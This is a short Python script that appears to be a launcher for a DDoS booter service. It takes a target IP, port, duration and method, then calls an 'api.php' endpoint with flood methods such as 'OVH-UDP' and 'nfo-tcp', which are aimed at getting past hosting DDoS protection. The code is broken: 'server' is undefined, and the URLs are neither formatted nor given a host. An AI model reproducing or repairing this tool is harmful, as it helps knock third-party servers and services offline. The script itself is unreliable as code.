import requests
import sys
import os
#this is just an example nothing big 

ip = sys.argv[1]
port = int((sys.argv[2]))
time = int((sys.argv[3]))
method = sys.argv[4]

def main():
	if server == "Bypass":
		bypass()
	if server == "Home":
		home()
	else:
		print("error")

def bypass():
	if method == "ovh":
		url = "api/api.php&host={ip}&port={port}&time={time}&method=SASX"
		url2 = "api/api.php&host={ip}&port={port}&time={time}&method=OVH-UDP"
		requests.get(url)
		requests.get(url2)

def home():
	if method == "nfo":
		url = "api/api.php&host={ip}&port={port}&time={time}&method=nfo-tcp"
		url2 = "api/api.php&host={ip}&port={port}&time={time}&method=nfo-udp"
		requests.get(url)
		requests.get(url2)



main()

